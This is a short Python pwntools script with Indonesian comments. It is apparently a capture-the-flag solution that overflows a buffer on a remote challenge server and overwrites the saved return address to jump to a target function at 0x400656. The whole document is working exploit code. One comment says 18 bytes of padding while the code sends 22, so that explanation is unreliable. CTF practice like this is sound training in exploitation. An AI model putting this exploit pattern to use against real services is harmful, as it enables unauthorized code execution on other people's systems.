from pwn import *

# Koneksi ke server
r = remote("ctf99.cs.ui.ac.id", 10004)

# Dapatkan alamat fungsi target
target_addr = 0x400656   # kita bisa mendapatkan alamat ini dengan menggunakan gdb atau decompiler seperti Ghidra

# Membaca pesan dari server
print(r.recvline().decode())

# Buat payload
padding = b'A' * 22 # 18 byte padding untuk mengisi buffer dan menyentuh saved return address
payload = padding + p64(target_addr)  # Menggantikan alamat return dengan alamat fungsi target

# Kirim payload
r.sendline(payload)

# Baca hasilnya
print(r.recvall())

# Tutup koneksi
r.close()